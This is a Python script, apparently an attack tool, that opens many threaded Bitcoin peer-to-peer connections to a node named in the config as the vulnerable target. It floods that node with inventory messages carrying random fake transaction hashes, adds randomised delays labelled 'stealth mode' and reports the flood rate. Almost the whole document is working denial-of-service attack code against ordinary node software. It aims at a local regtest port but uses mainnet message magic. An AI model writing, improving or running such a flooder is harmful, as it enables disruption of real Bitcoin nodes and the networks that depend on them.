import socket
import threading
import time
import random
import os
from hashlib import sha256

# Config
VULN_NODE_IP = "127.0.0.1"
VULN_NODE_PORT = 18444  # Regtest default port
THREAD_COUNT = min(64, os.cpu_count() * 2)  # Max threads based on CPU
TX_PER_THREAD = 500
FEE = 5000  # Satoshis

class BitcoinP2P:
    def __init__(self):
        self.magic = b"\xf9\xbe\xb4\xd9"  # Mainnet magic (change for regtest)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.lock = threading.Lock()
    
    def connect(self):
        self.socket.connect((VULN_NODE_IP, VULN_NODE_PORT))
        self.send_version()
    
    def create_message(self, command, payload):
        command = command.ljust(12, b"\x00")
        length = len(payload).to_bytes(4, "little")
        checksum = sha256(sha256(payload).digest()).digest()[:4]  # ✅ FIXED
        return self.magic + command + length + checksum + payload
    
    def send_raw(self, data):
        with self.lock:
            self.socket.sendall(data)
    
    def send_version(self):
        # Minimal version message
        version = b"\x7f\x11\x01\x00" + b"\x00" * 26  # Version 70015
        self.send_message(b"version", version)
    
    def send_inv(self, tx_hashes):
        inv_count = len(tx_hashes).to_bytes(1, "little")
        inv_data = b"".join([b"\x01\x00\x00\x00" + tx for tx in tx_hashes])
        self.send_message(b"inv", inv_count + inv_data)
    
    def send_message(self, command, payload):
        message = self.create_message(command, payload)
        self.send_raw(message)

def fake_transaction_generator():
    """Generate pseudo-valid transaction hashes (replace with real TX creation)"""
    while True:
        yield sha256(str(random.getrandbits(256)).encode()).digest()[::-1]  # Fake TXID

def flood_worker(p2p, tx_gen, count):
    p2p.connect()
    for _ in range(count):
        tx_hashes = [next(tx_gen) for _ in range(random.randint(50, 100))]  # ✅ VARIABLE SIZE
        try:
            p2p.send_inv(tx_hashes)
            time.sleep(random.uniform(0.01, 0.1))  # ✅ STEALTH MODE
        except Exception as e:
            print(f"Error: {e}")
            break

def main():
    start_time = time.time()
    tx_gen = fake_transaction_generator()
    
    threads = []
    for _ in range(THREAD_COUNT):
        p2p = BitcoinP2P()
        t = threading.Thread(target=flood_worker, args=(p2p, tx_gen, TX_PER_THREAD))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    duration = time.time() - start_time
    print(f"Flood completed in {duration:.2f}s")
    print(f"Approximate TX rate: {(THREAD_COUNT * TX_PER_THREAD * 50) / duration:.0f} TX/s")

if __name__ == "__main__":
    main()
